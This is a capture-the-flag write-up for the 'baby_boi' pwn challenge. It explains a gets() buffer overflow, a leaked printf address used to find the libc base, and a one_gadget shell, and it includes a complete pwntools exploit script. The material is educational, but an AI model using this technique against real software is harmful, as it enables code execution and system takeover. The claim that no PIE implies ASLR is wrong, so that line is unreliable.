# 3: Baby_boi

First Written: 6.4.2020

Last Updated: 6.4.2020

This problem may seem intimidating at first. We are given the binary, the source code, and a .so file. 

## Steps to pwn 

Let's run the given binary a few times and see what it does.

```
./baby_boi 
Hello!
Here I am: 0x7f48f0219e80

```

Note the following:
- The address listed after "Here I am:" changes each time we run the binary
- The binary prompts us for input after it gives us an address, but then it doesn't seem to do anything

After running the binary, let's run the usual *file* and *checksec* commands to gather some more information. 

Output of *file*:
```
file baby_boi 
baby_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=e1ff55dce2efc89340b86a666bba5e7ff2b37f62, not stripped
```

Output of checksec: 
```
 checksec baby_boi
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Note the following:
- The binary is 64-bits, meaning that we are dealing with 64-bit registers. 
- The binary is dynamically linked, meaning that it uses a shared library (it pulls code from outside sources in order to run). 
- NX (non-executable stack) is enabled, so no shellcode here. 
- No PIE means that ASLR is enabled. This is why the address the program gives us always changes (the location of libc will always change in memory). 

Now let's examine the source code: 
```
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv[]) {
  char buf[32];
  printf("Hello!\n");
  printf("Here I am: %p\n", printf);
  gets(buf);
}
```

Note the following: 
- Using printf and %p, the binary prints the location of printf in memory
- gets is used, which is a function that is **super** vulnerable to buffer overflows and shouldn't be used in modern practice 
- 32 bytes is allocated for the gets input from the user

While the location of the libc file always changes everytime the binary is run, what doesn't change is function offsets. Let's find the offset of the printf function, as the binary already tells us where printf is in memory once we run it. 

A function offset is its location in the libc file relative to where the libc file starts. 

To find a function offset in libc you can do one of the following:
-> use readelf and search for the function name 
```
readelf -s libc-2.27.so | grep ' printf@'
   627: 0000000000064e80   195 FUNC    GLOBAL DEFAULT   13 printf@@GLIBC_2.2.5
```

-> use pwntools, which makes life easy, as you don't have to hardcode most values
```
from pwn import * 
libc = ELF("./libc-2.27.so")
print(libc.symbols["printf"])
```

We also want to spawn a shell. This is often done by calling execve("/bin/sh"). I will be linking an alternative way to do this than what is being discussed in this writeup, but we will be using the lazier way for this one. 

The "lazier" way is by using the [OneGadget](https://github.com/david942j/one_gadget) tool to find a one-liner ROP (return oriented programming) gadget in libc. 

```
one_gadget libc-2.27.so 
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

OneGadget found three instances of a one-liner ROP Gadget that will call execve("/bin/sh"), but since we have not run the binary yet, we only have the ROP Gadgets' offsets from the libc base, not its actual location in memory. 
  

The equation to find the address of the ROPGadget in memory will look like this: 
```
ROPGadget address = libc_base + offset
```

We will use the offset 0x4f2c5.

It seems that all is left is to compute where libc is memory once we execute the binary. When we execute the binary, it gives us the location of printf, and we have already found the offset of printf in libc.

The equation to find the address of libc in memory will look like this: 
```
libc base address = printf_location_in_memory - printf_offset
```

Knowing this, let's write our exploit, keeping in mind that we will be taking advantage of a buffer overflow vulnerability (which I will not be explaning in detail here, but I will link to resources at the end of the writeup).

Exploit:
```
from pwn import *

#start the process
r = process('./baby_boi')

#use ELF to store libc so we don't have to hardcode most values
libc = ELF("./libc-2.27.so")

r.recvuntil('I am:')

#get the location of printf in memory based off of what the binary tells us, and conver the hex value to decimal 
printf_address = int(r.recvuntil("\n"), 16)

#compute the location of libc in memory using the location of printf and its offset in libc
libc_base = printf_address - libc.symbols["printf"]

#offset of the oneGadget we found using the oneGadget tool 
one_gadget = 0x4f2c5

#compute the address of the oneGadget in memory
one_gadget_address = libc_base + one_gadget

#create our evil input, 40 A's overflows the buffer and overwrites RBP, and then we eat into the return address to hijack RIP
evil = "A"*40 + p64(one_gadget_address)

r.sendline(evil)
r.interactive()
```

## Extra resources to feed the brain
https://en.wikipedia.org/wiki/GNU_C_Library
https://superuser.com/questions/71404/what-is-an-so-file
https://www.thegeekstuff.com/2012/06/linux-shared-libraries/
https://blog.vero.site/post/baby-boi
https://tasteofsecurity.com/security/ret2libc-unknown-libc/

**big creds to the below writeup for being super helpful, concise, everything nice**
https://cesena.github.io/2019/09/16/baby-boi/ 

## TODO:
- format the links
